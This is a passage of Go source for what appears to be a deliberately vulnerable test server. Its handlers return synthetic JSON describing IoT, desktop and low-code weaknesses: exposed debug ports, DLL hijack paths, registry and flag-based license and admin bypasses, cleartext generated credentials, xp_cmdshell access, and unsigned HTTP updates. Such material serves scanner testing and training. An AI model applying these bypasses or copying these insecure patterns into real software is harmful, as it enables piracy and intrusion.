// ---------------------------------------------------------------------------

func (h *Handler) serveIoTNoPhysicalHardening(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "iot-no-physical-hardening")

	resp := toJSON(map[string]interface{}{
		"device_id": fmt.Sprintf("IOT-%s", h.randomHex(rng, 8)),
		"model":     "SmartHub Pro X1",
		"physical_security": map[string]interface{}{
			"tamper_detection":   false,
			"tamper_response":    "none",
			"enclosure_lock":     false,
			"anti_tamper_seal":   false,
			"potting_compound":   false,
			"secure_boot":       false,
		},
		"debug_ports": map[string]interface{}{
			"jtag": map[string]interface{}{
				"exposed":       true,
				"labeled":       true,
				"fuse_blown":    false,
				"password":      "none",
				"access":        "full chip read/write",
			},
			"uart": map[string]interface{}{
				"exposed":       true,
				"labeled":       true,
				"baud_rate":     115200,
				"root_shell":    true,
				"boot_log":      true,
			},
			"swd": map[string]interface{}{
				"exposed":       true,
				"locked":        false,
				"readout_protection": "disabled",
			},
			"usb": map[string]interface{}{
				"exposed":       true,
				"dfu_mode":      true,
				"adb_enabled":   true,
			},
		},
		"storage_security": map[string]interface{}{
			"flash_encrypted":    false,
			"flash_type":         "SPI NOR",
			"removable":          true,
			"readout_protection": false,
			"firmware_extractable": true,
			"filesystem":         "squashfs (no encryption)",
		},
		"side_channel": map[string]interface{}{
			"power_analysis_resistant":  false,
			"em_shielding":             false,
			"timing_attack_mitigation": false,
			"decapping_resistant":      false,
		},
		"_warning": "JTAG port exposed and labeled on PCB. No tamper detection. Flash memory readable. No secure boot.",
	})
	return h.iotJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// DA1: Injection (DLL Search Order Hijack)
// ---------------------------------------------------------------------------

func (h *Handler) serveDesktopInjection(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "desktop-injection")

	resp := toJSON(map[string]interface{}{
		"application": map[string]interface{}{
			"name":      "AcmeEditor Pro",
			"version":   fmt.Sprintf("%d.%d.%d", rng.Intn(5)+1, rng.Intn(20), rng.Intn(100)),
			"path":      "C:\\Program Files\\AcmeEditor\\AcmeEditor.exe",
			"publisher": "Acme Software Inc.",
		},
		"dll_search_order": []map[string]interface{}{
			{"priority": 1, "path": "C:\\Program Files\\AcmeEditor\\", "writable": false, "description": "Application directory"},
			{"priority": 2, "path": "C:\\Users\\Public\\Documents\\AcmeEditor\\plugins\\", "writable": true, "description": "User-writable plugin directory"},
			{"priority": 3, "path": "C:\\Windows\\System32\\", "writable": false, "description": "System directory"},
			{"priority": 4, "path": "C:\\Windows\\", "writable": false, "description": "Windows directory"},
			{"priority": 5, "path": "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\", "writable": true, "description": "User temp directory"},
			{"priority": 6, "path": "%PATH%", "writable": true, "description": "PATH environment variable directories"},
		},
		"vulnerable_dlls": []map[string]interface{}{
			{"name": "version.dll", "loaded_from": "search_path", "signed": false, "hijackable": true},
			{"name": "dbghelp.dll", "loaded_from": "search_path", "signed": false, "hijackable": true},
			{"name": "winhttp.dll", "loaded_from": "search_path", "signed": false, "hijackable": true},
			{"name": "cryptbase.dll", "loaded_from": "search_path", "signed": false, "hijackable": true},
		},
		"process_config": map[string]interface{}{
			"integrity_level":  "medium",
			"dep_enabled":      false,
			"aslr_enabled":     false,
			"cfg_enabled":      false,
			"safe_dll_search":  false,
			"manifest_uac":     "asInvoker",
		},
		"environment_variables": map[string]interface{}{
			"ACME_PLUGIN_PATH": "C:\\Users\\Public\\Documents\\AcmeEditor\\plugins",
			"ACME_TEMP":        "%TEMP%\\AcmeEditor",
			"ACME_DEBUG_DLL":   "C:\\debug\\custom_hook.dll",
		},
		"_warning": "DLL search order allows hijacking via user-writable plugin directory. DEP and ASLR disabled. No DLL signature verification.",
	})
	return h.desktopJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// DA2: Broken Authentication (License Key)
// ---------------------------------------------------------------------------

func (h *Handler) serveDesktopBrokenAuth(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "desktop-broken-auth")

	resp := toJSON(map[string]interface{}{
		"application": map[string]interface{}{
			"name":    "GlobexSync Enterprise",
			"version": fmt.Sprintf("%d.%d", rng.Intn(10)+1, rng.Intn(50)),
		},
		"license_validation": map[string]interface{}{
			"method":            "local_file_check",
			"server_validation": false,
			"offline_mode":      true,
			"grace_period_days": 9999,
		},
		"license_data": map[string]interface{}{
			"key":            fmt.Sprintf("GLEX-%s-%s-%s-%s", h.randomHex(rng, 4), h.randomHex(rng, 4), h.randomHex(rng, 4), h.randomHex(rng, 4)),
			"type":           "enterprise_unlimited",
			"seats":          999999,
			"expiry":         "2099-12-31",
			"owner":          h.firstNames[rng.Intn(len(h.firstNames))] + " " + h.lastNames[rng.Intn(len(h.lastNames))],
			"email":          h.randomEmail(rng),
			"features":       []string{"all_modules", "priority_support", "white_label", "api_access", "unlimited_storage"},
		},
		"license_file": map[string]interface{}{
			"path":       "C:\\ProgramData\\GlobexSync\\license.dat",
			"format":     "plaintext INI",
			"encrypted":  false,
			"signed":     false,
			"tamper_check": false,
			"content_preview": fmt.Sprintf("[License]\nKey=GLEX-%s\nType=enterprise\nSeats=999999\nExpiry=2099-12-31\nChecksum=none\n", h.randomHex(rng, 16)),
		},
		"auth_bypass": map[string]interface{}{
			"registry_key":       "HKCU\\Software\\GlobexSync\\Licensed",
			"registry_value":     "1",
			"env_var_override":   "GLEX_LICENSED=true",
			"debug_flag":         "--skip-license-check",
			"trial_reset":        "delete %APPDATA%\\GlobexSync\\trial.dat",
		},
		"_warning": "License stored in plaintext file with no signature or tamper detection. Registry bypass available.",
	})
	return h.desktopJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// DA3: Sensitive Data Exposure
// ---------------------------------------------------------------------------

func (h *Handler) serveDesktopSensitiveData(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "desktop-sensitive-data")

	users := []map[string]interface{}{}
	for i := 0; i < 5; i++ {
		users = append(users, map[string]interface{}{
			"id":       rng.Intn(9000) + 1000,
			"username": h.firstNames[rng.Intn(len(h.firstNames))],
			"password": fmt.Sprintf("%s%d!", h.lastNames[rng.Intn(len(h.lastNames))], rng.Intn(9999)),
			"email":    h.randomEmail(rng),
			"api_key":  fmt.Sprintf("sk_%s", h.randomHex(rng, 24)),
		})
	}

	resp := toJSON(map[string]interface{}{
		"application": map[string]interface{}{
			"name":    "InitechManager",
			"version": fmt.Sprintf("%d.%d.%d", rng.Intn(3)+1, rng.Intn(10), rng.Intn(50)),
		},
		"data_directory": map[string]interface{}{
			"path":         "C:\\Users\\%USERNAME%\\AppData\\Local\\InitechManager\\",
			"permissions":  "user_read_write",
			"encrypted":    false,
		},
		"sqlite_database": map[string]interface{}{
			"file":       "C:\\Users\\%USERNAME%\\AppData\\Local\\InitechManager\\data.sqlite",
			"encrypted":  false,
			"wal_mode":   true,
			"tables":     []string{"users", "credentials", "sessions", "payment_methods", "audit_log"},
		},
		"cleartext_passwords": users,
		"config_file": map[string]interface{}{
			"path":    "C:\\Users\\%USERNAME%\\AppData\\Local\\InitechManager\\config.json",
			"content": map[string]interface{}{
				"db_connection":  fmt.Sprintf("Server=prod-db.initech.com;User=sa;Password=Pr0d_%s;", h.randomHex(rng, 8)),
				"smtp_password":  fmt.Sprintf("smtp_%s", h.randomHex(rng, 16)),
				"encryption_key": h.randomHex(rng, 32),
				"api_secret":     fmt.Sprintf("sk_%s", h.randomHex(rng, 40)),
			},
		},
		"temp_files": []map[string]interface{}{
			{"path": "%TEMP%\\InitechManager\\export_users.csv", "contains": "user passwords in cleartext", "deleted_on_exit": false},
			{"path": "%TEMP%\\InitechManager\\debug.log", "contains": "SQL queries with credentials", "deleted_on_exit": false},
			{"path": "%TEMP%\\InitechManager\\crash_dump.dmp", "contains": "memory dump with sensitive data", "deleted_on_exit": false},
		},
		"_warning": "Passwords stored in cleartext SQLite. Config file contains production database credentials. Temp files not cleaned up.",
	})
	return h.desktopJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// DA4: Improper Cryptography
// ---------------------------------------------------------------------------

func (h *Handler) serveDesktopImproperCrypto(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "desktop-improper-crypto")

	xorKey := h.randomHex(rng, 16)
	resp := toJSON(map[string]interface{}{
		"application": map[string]interface{}{
			"name":    "UmbraVault",
			"version": fmt.Sprintf("%d.%d", rng.Intn(4)+1, rng.Intn(30)),
		},
		"encryption_config": map[string]interface{}{
			"algorithm":    "XOR",
			"mode":         "ECB",
			"key_size":     64,
			"key_source":   "hardcoded",
			"key_rotation": "never",
			"iv":           "not used",
			"padding":      "none",
		},
		"hardcoded_keys": map[string]interface{}{
			"xor_key":           xorKey,
			"key_location":      "embedded in binary at offset 0x4A2F00",
			"obfuscation":       "base64 encoded (trivially reversible)",
			"same_key_all_users": true,
		},
		"password_storage": map[string]interface{}{
			"hash_algorithm":  "MD5",
			"salted":          false,
			"iterations":      1,
			"rainbow_table_vulnerable": true,
			"example_hash":    fmt.Sprintf("%s", h.randomHex(rng, 32)),
		},
		"tls_config": map[string]interface{}{
			"min_version":           "TLS 1.0",
			"weak_ciphers_enabled":  true,
			"cipher_suites":         []string{"TLS_RSA_WITH_RC4_128_SHA", "TLS_RSA_WITH_3DES_EDE_CBC_SHA", "TLS_RSA_WITH_AES_128_CBC_SHA"},
			"certificate_validation": false,
		},
		"random_number_generation": map[string]interface{}{
			"method":  "time-seeded PRNG",
			"source":  "System.currentTimeMillis()",
			"csprng":  false,
		},
		"_warning": "XOR encryption with hardcoded key embedded in binary. MD5 password hashing without salt. TLS 1.0 with RC4.",
	})
	return h.desktopJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// DA5: Improper Authorization
// ---------------------------------------------------------------------------

func (h *Handler) serveDesktopImproperAuthz(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "desktop-improper-authz")

	resp := toJSON(map[string]interface{}{
		"application": map[string]interface{}{
			"name":    "NexusClient",
			"version": fmt.Sprintf("%d.%d.%d", rng.Intn(5)+1, rng.Intn(10), rng.Intn(50)),
		},
		"registry_entries": []map[string]interface{}{
			{"key": "HKCU\\Software\\NexusClient\\Auth", "value": "IsAdmin", "data": "1", "type": "REG_DWORD", "description": "Admin bypass flag - set to 1 for admin access"},
			{"key": "HKCU\\Software\\NexusClient\\Auth", "value": "BypassLicense", "data": "1", "type": "REG_DWORD", "description": "Skip license validation"},
			{"key": "HKCU\\Software\\NexusClient\\Auth", "value": "DebugMode", "data": "1", "type": "REG_DWORD", "description": "Enable debug menu with elevated privileges"},
			{"key": "HKCU\\Software\\NexusClient\\Auth", "value": "UserRole", "data": "superadmin", "type": "REG_SZ", "description": "Role string checked at startup"},
			{"key": "HKLM\\Software\\NexusClient\\Features", "value": "AllModules", "data": "1", "type": "REG_DWORD", "description": "Unlock all premium modules"},
		},
		"authorization_model": map[string]interface{}{
			"type":                "client-side only",
			"server_enforcement":  false,
			"role_check_location": "registry + local config",
			"privilege_escalation": map[string]interface{}{
				"method":      "modify registry key",
				"requires":    "user-level access",
				"persistence": "survives updates",
			},
		},
		"file_permissions": map[string]interface{}{
			"config_dir":    map[string]interface{}{"path": "C:\\ProgramData\\NexusClient\\", "acl": "Everyone:FullControl"},
			"plugin_dir":    map[string]interface{}{"path": "C:\\Program Files\\NexusClient\\plugins\\", "acl": "Users:Modify"},
			"log_dir":       map[string]interface{}{"path": "C:\\ProgramData\\NexusClient\\logs\\", "acl": "Everyone:FullControl"},
		},
		"ipc_security": map[string]interface{}{
			"named_pipe":      "\\\\.\\pipe\\NexusClient",
			"pipe_acl":        "Everyone:ReadWrite",
			"message_signing": false,
			"authentication":  "none",
		},
		"_warning": "Admin role controlled by user-writable registry key. No server-side authorization enforcement. Named pipe accessible to all users.",
	})
	return h.desktopJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// DA6: Security Misconfiguration
// ---------------------------------------------------------------------------

func (h *Handler) serveDesktopMisconfig(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "desktop-misconfig")

	resp := toJSON(map[string]interface{}{
		"application": map[string]interface{}{
			"name":    "AcmeEditor Pro",
			"version": fmt.Sprintf("%d.%d.%d", rng.Intn(5)+1, rng.Intn(20), rng.Intn(100)),
		},
		"application_xml": map[string]interface{}{
			"path": "C:\\Program Files\\AcmeEditor\\application.xml",
			"settings": map[string]interface{}{
				"debug":               true,
				"verbose_errors":      true,
				"stack_traces":        true,
				"code_signing":        false,
				"auto_update_check":   false,
				"telemetry_opt_out":   false,
				"sandbox_mode":        false,
				"allow_unsigned_plugins": true,
			},
		},
		"code_signing": map[string]interface{}{
			"binary_signed":    false,
			"installer_signed": false,
			"dll_signing":      false,
			"timestamp":        false,
			"certificate":      "none",
			"enforcement":      "disabled",
		},
		"debug_features": map[string]interface{}{
			"debug_console":     true,
			"debug_port":        fmt.Sprintf("%d", rng.Intn(10000)+40000),
			"profiling":         true,
			"memory_dump":       true,
			"remote_debug":      true,
			"debug_api":         fmt.Sprintf("http://localhost:%d/debug", rng.Intn(10000)+40000),
		},
		"installation": map[string]interface{}{
			"install_path_writable": true,
			"world_writable_dirs":   []string{"plugins", "themes", "cache", "logs"},
			"temp_dir_cleanup":      false,
			"uninstall_complete":    false,
			"leftover_data":        true,
		},
		"sample_error_output": fmt.Sprintf(`FATAL ERROR at 0x%s:
Stack trace:
  AcmeEditor.exe!CDocument::OnOpen+0x%s
  AcmeEditor.exe!CMainFrame::LoadFile+0x%s
  msvcrt.dll!_initterm+0x15
Internal DB: Server=prod-sql.acme.com;User=app_svc;Password=Acm3Pr0d_%s;
Config path: C:\ProgramData\AcmeEditor\secrets.xml`, h.randomHex(rng, 8), h.randomHex(rng, 4), h.randomHex(rng, 4), h.randomHex(rng, 8)),
		"_warning": "Debug mode enabled in production. No code signing. Verbose errors expose internal paths and credentials.",
	})
	return h.desktopJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// DA7: Insecure Communication
// ---------------------------------------------------------------------------

func (h *Handler) serveDesktopInsecureComms(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "desktop-insecure-comms")

	resp := toJSON(map[string]interface{}{
		"application": map[string]interface{}{
			"name":    "GlobexSync",
			"version": fmt.Sprintf("%d.%d", rng.Intn(8)+1, rng.Intn(40)),
		},
		"api_calls": []map[string]interface{}{
			{"endpoint": "http://api.globex.com/v1/auth/login", "method": "POST", "tls": false, "sends": "username + password in body"},
			{"endpoint": "http://api.globex.com/v1/users/profile", "method": "GET", "tls": false, "sends": "session token in header"},
			{"endpoint": "http://api.globex.com/v1/sync/upload", "method": "PUT", "tls": false, "sends": "user files in multipart body"},
			{"endpoint": "http://api.globex.com/v1/billing/payment", "method": "POST", "tls": false, "sends": "credit card details"},
			{"endpoint": "http://api.globex.com/v1/license/validate", "method": "POST", "tls": false, "sends": "license key + machine fingerprint"},
			{"endpoint": "http://telemetry.globex.com/collect", "method": "POST", "tls": false, "sends": "usage analytics + system info"},
		},
		"certificate_pinning": map[string]interface{}{
			"enabled":             false,
			"pin_set":             []string{},
			"backup_pins":         []string{},
			"max_age":             0,
			"report_uri":          "",
			"include_subdomains":  false,
		},
		"network_security": map[string]interface{}{
			"proxy_support":          true,
			"proxy_auth_leak":        true,
			"dns_over_https":         false,
			"hostname_verification":  false,
			"redirect_following":     true,
			"max_redirects":          "unlimited",
		},
		"intercepted_sample": map[string]interface{}{
			"request": fmt.Sprintf("POST /v1/auth/login HTTP/1.1\r\nHost: api.globex.com\r\nContent-Type: application/json\r\n\r\n{\"username\":\"%s\",\"password\":\"%s%d!\"}", h.firstNames[rng.Intn(len(h.firstNames))], h.lastNames[rng.Intn(len(h.lastNames))], rng.Intn(9999)),
			"response": fmt.Sprintf("{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.%s\",\"expires\":86400}", h.randomHex(rng, 32)),
		},
		"_warning": "All API calls use HTTP (not HTTPS). No certificate pinning. Login credentials and payment info sent in cleartext.",
	})
	return h.desktopJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// DA8: Poor Code Quality
// ---------------------------------------------------------------------------

func (h *Handler) serveDesktopPoorCodeQuality(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "desktop-poor-code-quality")

	resp := toJSON(map[string]interface{}{
		"application": map[string]interface{}{
			"name":    "InitechManager",
			"version": fmt.Sprintf("%d.%d.%d", rng.Intn(3)+1, rng.Intn(10), rng.Intn(50)),
		},
		"crash_dump": map[string]interface{}{
			"type":       "EXCEPTION_STACK_BUFFER_OVERRUN",
			"code":       "0xC0000409",
			"address":    fmt.Sprintf("0x%s", h.randomHex(rng, 16)),
			"module":     "InitechManager.exe",
			"timestamp":  "2024-12-15T14:23:41Z",
			"thread_id":  rng.Intn(90000) + 10000,
		},
		"stack_trace": []map[string]interface{}{
			{"frame": 0, "module": "InitechManager.exe", "function": "CParser::ParseInput", "offset": fmt.Sprintf("+0x%s", h.randomHex(rng, 3)), "source": "parser.cpp:847"},
			{"frame": 1, "module": "InitechManager.exe", "function": "CBuffer::Write", "offset": fmt.Sprintf("+0x%s", h.randomHex(rng, 3)), "source": "buffer.cpp:124"},
			{"frame": 2, "module": "InitechManager.exe", "function": "strcpy", "offset": "+0x12", "source": "(no source - unsafe function)"},
			{"frame": 3, "module": "InitechManager.exe", "function": "CNetworkHandler::OnReceive", "offset": fmt.Sprintf("+0x%s", h.randomHex(rng, 3)), "source": "network.cpp:391"},
			{"frame": 4, "module": "InitechManager.exe", "function": "CMainLoop::ProcessMessage", "offset": fmt.Sprintf("+0x%s", h.randomHex(rng, 3)), "source": "mainloop.cpp:56"},
			{"frame": 5, "module": "ntdll.dll", "function": "RtlUserThreadStart", "offset": "+0x21", "source": "(system)"},
		},
		"memory_state": map[string]interface{}{
			"stack_cookie":   fmt.Sprintf("0x%s (corrupted)", h.randomHex(rng, 8)),
			"heap_corruption": true,
			"buffer_contents": fmt.Sprintf("41414141 41414141 41414141 %s %s (overwritten return address)", h.randomHex(rng, 8), h.randomHex(rng, 8)),
			"input_length":    4096,
			"buffer_size":     256,
		},
		"code_analysis": map[string]interface{}{
			"unsafe_functions": []string{"strcpy", "sprintf", "strcat", "gets", "scanf"},
			"buffer_overflows": 12,
			"use_after_free":   3,
			"null_dereference": 7,
			"integer_overflow": 4,
			"format_string":    2,
			"race_conditions":  5,
			"memory_leaks":     18,
		},
		"build_security": map[string]interface{}{
			"stack_canary":  false,
			"dep_nx":        false,
			"aslr":          false,
			"cfg":           false,
			"safe_seh":      false,
			"fortify_source": false,
		},
		"_warning": "Buffer overflow via strcpy in network input handler. No stack canary, DEP, or ASLR. 12 known buffer overflows in codebase.",
	})
	return h.desktopJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// DA9: Using Components with Known Vulnerabilities (Broken Update)
// ---------------------------------------------------------------------------

func (h *Handler) serveDesktopBrokenUpdate(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "desktop-broken-update")

	resp := toJSON(map[string]interface{}{
		"application": map[string]interface{}{
			"name":    "NexusClient",
			"version": fmt.Sprintf("%d.%d.%d", rng.Intn(5)+1, rng.Intn(10), rng.Intn(50)),
		},
		"update_manifest": map[string]interface{}{
			"url":      fmt.Sprintf("http://updates.nexusclient.com/manifest/%s.xml", h.randomHex(rng, 8)),
			"protocol": "HTTP",
			"tls":      false,
		},
		"update_config": map[string]interface{}{
			"check_url":           "http://updates.nexusclient.com/latest",
			"download_url":        fmt.Sprintf("http://updates.nexusclient.com/releases/NexusClient-%d.%d.%d-setup.exe", rng.Intn(5)+2, 0, 0),
			"signature_verify":    false,
			"checksum_verify":     false,
			"certificate_pinning": false,
			"rollback_support":    false,
			"delta_updates":       false,
		},
		"manifest_content": map[string]interface{}{
			"latest_version": fmt.Sprintf("%d.%d.%d", rng.Intn(5)+2, 0, 0),
			"release_date":   "2024-12-01",
			"download_size":  rng.Intn(100000000) + 50000000,
			"sha256":         "not provided",
			"pgp_signature":  "not provided",
			"code_signing":   "not provided",
			"changelog":      "Bug fixes and improvements",
		},
		"attack_vectors": []map[string]interface{}{
			{"type": "MITM", "description": "HTTP manifest allows modification of download URL", "difficulty": "low"},
			{"type": "DNS hijack", "description": "Redirect updates.nexusclient.com to attacker server", "difficulty": "medium"},
			{"type": "Binary replacement", "description": "No signature verification on downloaded installer", "difficulty": "low"},
			{"type": "Downgrade", "description": "No version pinning allows installing older vulnerable version", "difficulty": "low"},
		},
		"_warning": "Update manifest and binary served over HTTP. No signature verification. Trivially MITM-able.",
	})
	return h.desktopJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// DA10: Insufficient Logging and Monitoring
// ---------------------------------------------------------------------------

func (h *Handler) serveDesktopInsufficientLogging(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "desktop-insufficient-logging")

	resp := toJSON(map[string]interface{}{
		"application": map[string]interface{}{
			"name":    "UmbraTools Suite",
			"version": fmt.Sprintf("%d.%d.%d", rng.Intn(3)+1, rng.Intn(15), rng.Intn(80)),
		},
		"logging_config": map[string]interface{}{
			"event_log":        false,
			"file_log":         false,
			"syslog":           false,
			"windows_event_log": false,
			"log_level":        "none",
			"log_rotation":     "not configured",
			"log_retention":    "not configured",
		},
		"monitoring": map[string]interface{}{
			"crash_reporting":     false,
			"error_tracking":     false,
			"performance_monitoring": false,
			"usage_analytics":    false,
			"health_checks":     false,
			"heartbeat":         false,
		},
		"security_events_not_logged": []string{
			"Failed login attempts",
			"Privilege escalation",
			"Configuration changes",
			"File access/modification",
			"Network connections",
			"Plugin installation",
			"License validation failures",
			"Crash events",
			"DLL loading",
			"Registry modifications",
		},
		"audit_trail": map[string]interface{}{
			"enabled":      false,
			"tamper_proof": false,
			"centralized":  false,
			"alerting":     false,
		},
		"incident_response": map[string]interface{}{
			"detection_capability":  "none",
			"mean_time_to_detect":   "unknown (no monitoring)",
			"forensic_data":         "none available",
			"automated_response":    false,
		},
		"_warning": "No logging or monitoring of any kind. Failed logins, crashes, and security events are completely invisible.",
	})
	return h.desktopJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// LC1: Account Impersonation
// ---------------------------------------------------------------------------

func (h *Handler) serveLowCodeAccountImpersonation(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "lowcode-account-impersonation")

	svcAccountEmail := fmt.Sprintf("svc-automation@%s", h.domains[rng.Intn(len(h.domains))])
	userName := h.firstNames[rng.Intn(len(h.firstNames))] + "." + h.lastNames[rng.Intn(len(h.lastNames))]

	resp := toJSON(map[string]interface{}{
		"workflow": map[string]interface{}{
			"id":      fmt.Sprintf("wf-%s", h.randomHex(rng, 12)),
			"name":    "Employee Onboarding Automation",
			"status":  "active",
			"trigger": "When a new item is created in SharePoint",
			"created_by": userName,
		},
		"execution_context": map[string]interface{}{
			"runs_as":              svcAccountEmail,
			"service_account_role": "Global Administrator",
			"permissions": []string{
				"User.ReadWrite.All",
				"Directory.ReadWrite.All",
				"Mail.Send",
				"Sites.FullControl.All",
				"Exchange.ManageAsApp",
				"SharePoint.FullControl.All",
			},
			"consent_type":     "admin_consent",
			"impersonation":    true,
			"delegation_chain": []string{userName, svcAccountEmail, "Microsoft Graph API"},
		},
		"risk_assessment": map[string]interface{}{
			"privilege_level":   "highest",
			"scope":             "entire_tenant",
			"created_by_role":   "standard_user",
			"approved_by":       "auto-approved (no review process)",
			"last_reviewed":     "never",
			"connected_systems": []string{"Azure AD", "SharePoint", "Exchange", "Teams", "OneDrive"},
		},
		"recent_actions": []map[string]interface{}{
			{"action": "User.Create", "target": fmt.Sprintf("new.user@%s", h.domains[rng.Intn(len(h.domains))]), "timestamp": "2024-12-15T10:30:00Z", "performed_as": svcAccountEmail},
			{"action": "Group.AddMember", "target": "Domain Admins", "timestamp": "2024-12-15T10:30:05Z", "performed_as": svcAccountEmail},
			{"action": "Mail.Send", "target": "all-staff@" + h.domains[rng.Intn(len(h.domains))], "timestamp": "2024-12-15T10:30:10Z", "performed_as": svcAccountEmail},
		},
		"_warning": "Standard user created workflow that runs as Global Administrator. No approval process. Service account has full tenant access.",
	})
	return h.lowcodeJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// LC2: Authorization Misuse
// ---------------------------------------------------------------------------

func (h *Handler) serveLowCodeAuthzMisuse(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "lowcode-authz-misuse")

	resp := toJSON(map[string]interface{}{
		"shared_connection": map[string]interface{}{
			"id":          fmt.Sprintf("conn-%s", h.randomHex(rng, 8)),
			"name":        "Production Database (Admin)",
			"type":        "SQL Server",
			"created_by":  fmt.Sprintf("dba.%s@%s", h.lastNames[rng.Intn(len(h.lastNames))], h.domains[rng.Intn(len(h.domains))]),
			"sharing":     "everyone_in_organization",
			"embedded_credentials": true,
		},
		"connection_details": map[string]interface{}{
			"server":     fmt.Sprintf("prod-sql-%s.database.windows.net", h.randomHex(rng, 4)),
			"database":   "production_db",
			"auth_type":  "SQL Authentication",
			"username":   "sa",
			"password":   fmt.Sprintf("Pr0d_Admin_%s!", h.randomHex(rng, 8)),
			"role":       "db_owner",
		},
		"accessible_by": []map[string]interface{}{
			{"user": fmt.Sprintf("%s@%s", h.firstNames[rng.Intn(len(h.firstNames))], h.domains[rng.Intn(len(h.domains))]), "role": "standard_user", "can_query": true, "can_modify": true},
			{"user": fmt.Sprintf("%s@%s", h.firstNames[rng.Intn(len(h.firstNames))], h.domains[rng.Intn(len(h.domains))]), "role": "standard_user", "can_query": true, "can_modify": true},
			{"user": fmt.Sprintf("%s@%s", h.firstNames[rng.Intn(len(h.firstNames))], h.domains[rng.Intn(len(h.domains))]), "role": "guest", "can_query": true, "can_modify": true},
			{"user": "anyone_with_link", "role": "anonymous", "can_query": true, "can_modify": true},
		},
		"admin_apis_exposed": []map[string]interface{}{
			{"api": "DROP TABLE", "accessible": true, "description": "Delete any table via shared connection"},
			{"api": "CREATE LOGIN", "accessible": true, "description": "Create new SQL server logins"},
			{"api": "xp_cmdshell", "accessible": true, "description": "Execute OS commands via SQL"},
			{"api": "BACKUP DATABASE", "accessible": true, "description": "Full database backup to any path"},
		},
		"_warning": "DBA shared production SQL connection with sa credentials to entire organization. Any user can execute admin commands.",
	})
	return h.lowcodeJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// LC3: Data Leakage
// ---------------------------------------------------------------------------

func (h *Handler) serveLowCodeDataLeakage(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "lowcode-data-leakage")

	executionLogs := []map[string]interface{}{}
	for i := 0; i < 5; i++ {
		firstName := h.firstNames[rng.Intn(len(h.firstNames))]
		lastName := h.lastNames[rng.Intn(len(h.lastNames))]
		executionLogs = append(executionLogs, map[string]interface{}{
			"run_id":    fmt.Sprintf("run-%s", h.randomHex(rng, 8)),
			"timestamp": fmt.Sprintf("2024-12-%02dT%02d:%02d:00Z", rng.Intn(15)+1, rng.Intn(24), rng.Intn(60)),
			"action":    "Process_Employee_Record",
			"input_data": map[string]interface{}{
				"full_name":      firstName + " " + lastName,
				"ssn":            fmt.Sprintf("%03d-%02d-%04d", rng.Intn(900)+100, rng.Intn(90)+10, rng.Intn(9000)+1000),
				"date_of_birth":  fmt.Sprintf("19%02d-%02d-%02d", rng.Intn(60)+40, rng.Intn(12)+1, rng.Intn(28)+1),
				"salary":         rng.Intn(150000) + 45000,
				"bank_account":   fmt.Sprintf("****%04d", rng.Intn(10000)),
				"routing_number": fmt.Sprintf("%09d", rng.Intn(999999999)),
				"home_address":   fmt.Sprintf("%d %s Ave, %s, CA %05d", rng.Intn(9000)+100, lastName, firstName+"ville", rng.Intn(90000)+10000),
			},
			"output_data": map[string]interface{}{
				"status":   "processed",
				"record_id": rng.Intn(90000) + 10000,
			},
		})
	}

	resp := toJSON(map[string]interface{}{
		"workflow": map[string]interface{}{
			"id":          fmt.Sprintf("wf-%s", h.randomHex(rng, 12)),
			"name":        "HR Employee Processing",
			"environment": "production",
		},
		"execution_history": map[string]interface{}{
			"visible_to":     "all_workflow_editors",
			"retention":      "indefinite",
			"pii_masking":    false,
			"data_logged":    "full_input_and_output",
			"export_enabled": true,
		},
		"recent_executions": executionLogs,
		"data_exposure": map[string]interface{}{
			"total_runs":             12847,
			"records_with_pii":       12847,
			"editors_with_access":    47,
			"viewers_with_access":    183,
			"pii_fields_logged":      []string{"SSN", "date_of_birth", "salary", "bank_account", "routing_number", "home_address"},
			"dlp_policy":             "none",
		},
